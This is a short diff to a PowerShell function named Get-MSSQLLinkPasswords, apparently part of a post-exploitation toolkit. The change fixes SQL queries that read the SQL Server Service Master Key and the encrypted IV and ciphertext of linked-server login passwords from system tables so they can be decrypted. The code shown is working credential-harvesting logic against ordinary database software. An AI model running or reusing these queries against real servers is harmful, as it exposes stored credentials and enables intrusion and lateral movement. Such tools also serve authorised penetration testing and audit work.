@@ -71,7 +71,7 @@ function Get-MSSQLLinkPasswords{
     if ($Conn.State -eq "Open"){
       # Query Service Master Key from the database - remove padding from the key
       # key_id 102 eq service master key, thumbprint 3 means encrypted with machinekey
-      $SqlCmd="SELECT substring(crypt_property,9,len(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)"
+      $SqlCmd="SELECT substring(crypt_property,9,datalength(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)"
       $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
       $SmkBytes=$Cmd.ExecuteScalar()
     
@@ -97,7 +97,7 @@ function Get-MSSQLLinkPasswords{
         # Remove header from pwdhash, extract IV (as iv) and ciphertext (as pass)
 	    # Ignore links with blank credentials (integrated auth ?)
         $SqlCmd = "SELECT sysservers.srvname,syslnklgns.name,substring(syslnklgns.pwdhash,5,$ivlen) iv,substring(syslnklgns.pwdhash,$($ivlen+5),
-	    len(syslnklgns.pwdhash)-$($ivlen+4)) pass FROM master.sys.syslnklgns inner join master.sys.sysservers on syslnklgns.srvid=sysservers.srvid WHERE len(pwdhash)>0"
+        datalength(syslnklgns.pwdhash)-$($ivlen+4)) pass FROM master.sys.syslnklgns inner join master.sys.sysservers on syslnklgns.srvid=sysservers.srvid WHERE datalength(pwdhash)>0"
         $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
 	    $Data=$Cmd.ExecuteReader()
         $Dt = New-Object "System.Data.DataTable"
